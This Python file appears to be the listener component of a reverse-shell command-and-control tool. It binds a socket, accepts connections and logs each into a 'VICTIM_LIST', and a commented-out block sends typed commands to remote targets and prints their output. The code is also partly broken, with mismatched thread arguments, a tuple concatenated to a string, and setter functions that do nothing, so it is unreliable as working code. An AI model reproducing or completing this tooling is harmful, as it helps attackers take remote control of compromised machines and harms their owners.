import settings
import threading
import socketserver
import socket
from _thread import *
import time
import sys

def accept_connections(conn, addr):
    for c in settings.ALL_CONNECTIONS:
        c.close()
    del settings.ALL_CONNECTIONS[:]
    del settings.ALL_CONNECTIONS[:]
    while 1:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            settings.ALL_CONNECTIONS.append(conn)
            settings.ALL_CONNECTIONS.append(addr)
            settings.VICTIM_LIST[settings.VICTIM_CTR]['IP'] = addr
            settings.VICTIM_LIST[settings.VICTIM_CTR]['CONNECTION'] = conn
            settings.VICTIM_LIST[settings.VICTIM_CTR]['ID'] = settings.VICTIM_CTR
            settings.VICTIM_CTR += 1
            print('\nConnection has been established: ' + addr)
        except:
            print('Error accepting connections')

def create_server(ip, port):
    # Create listener
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    
    th = threading.Thread(target=accept_connections)
    th.daemon = True
    th.start()


def listen(ip, port):
    #Create Thread to start server
    th = threading.Thread(target=create_server, args=(ip, port))
    th.daemon = True
    th.start()


   




'''

Code save

    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

'''


def set_lhost(var, value):
    var = str(value)

def set_lport(var, value):
    var = int(value)

